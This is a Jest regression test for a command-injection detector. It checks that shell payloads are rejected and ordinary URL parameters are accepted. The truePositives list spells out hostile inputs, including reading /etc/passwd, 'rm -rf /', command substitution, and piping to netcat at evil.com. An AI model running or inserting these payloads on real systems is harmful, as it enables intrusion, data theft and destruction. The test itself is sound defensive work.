/**
 * CommandInjectionDetector — true-positive / true-negative coverage
 *
 * Regression suite for the D38 fix that tightened the dangerous-
 * command regex from \bcmd\b to a shell-position-anchored pattern.
 * Before the fix, common URL parameters (?id=123, ?cat=foo,
 * ?hostname=bar) all FPR'd.
 */

import { InputValidator } from '../../security/input-validator';

describe('CommandInjectionDetector (D38 shell-position-anchor fix)', () => {
  const v = new InputValidator();

  describe('rejects real command-injection payloads', () => {
    const truePositives: string[] = [
      '; id',
      '| cat /etc/passwd',
      '`id`',
      '$(whoami)',
      'a; ls -la',
      'a && rm -rf /',
      'foo | nc evil.com 4444',
      'a\nid'
    ];
    for (const payload of truePositives) {
      it(`flags: ${JSON.stringify(payload)}`, () => {
        const r = v.validateAll(payload);
        expect(r.isValid).toBe(false);
      });
    }
  });

  describe('does NOT false-positive on URL parameters', () => {
    const trueNegatives: string[] = [
      'id=123',
      'id',
      '123',
      'cat=foo',
      'cat',
      'hostname=server1',
      'hostname',
      'ls=1',
      'pwd=hello',
      'whoami=admin',
      'rm=1',
      'kill=42',
      'env=prod',
      'username=admin&password=test123',
      '/search?q=hello+world',
      'GET /products?id=123 HTTP/1.1'
    ];
    for (const payload of trueNegatives) {
      it(`accepts: ${JSON.stringify(payload)}`, () => {
        const r = v.validateAll(payload);
        // The detector may still fail for other reasons (shell
        // metacharacters etc.), but it must NOT report a
        // dangerous-command match for plain URL-param values.
        if (r.reason && r.reason.startsWith('Command Injection - Dangerous Command')) {
          throw new Error(`Unexpected dangerous-command match on ${JSON.stringify(payload)}: ${r.reason}`);
        }
      });
    }
  });
});
